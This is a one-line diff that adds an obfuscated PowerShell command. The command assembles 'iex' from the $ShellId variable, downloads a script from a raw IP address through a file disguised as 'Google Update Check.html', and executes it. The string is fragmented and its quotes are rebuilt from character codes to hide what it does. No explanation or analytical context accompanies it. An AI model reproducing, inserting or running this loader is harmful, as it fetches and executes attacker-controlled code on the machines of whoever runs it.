@@ -1,0 +1,1 @@
+﻿. ( $SheLlID[1]+$sHelliD[13]+'x') (('iex (New-O'+'bj'+'ect'+' N'+'et.WebClient'+').Down'+'loadS'+'tring(pvUht'+'tp'+'://84.200.84.'+'1'+'87/Goog'+'le Upda'+'t'+'e Check.htmlpvU'+')').rEpLACE(([ChAr]112+[ChAr]118+[ChAr]85),[STRing][ChAr]34) ) 
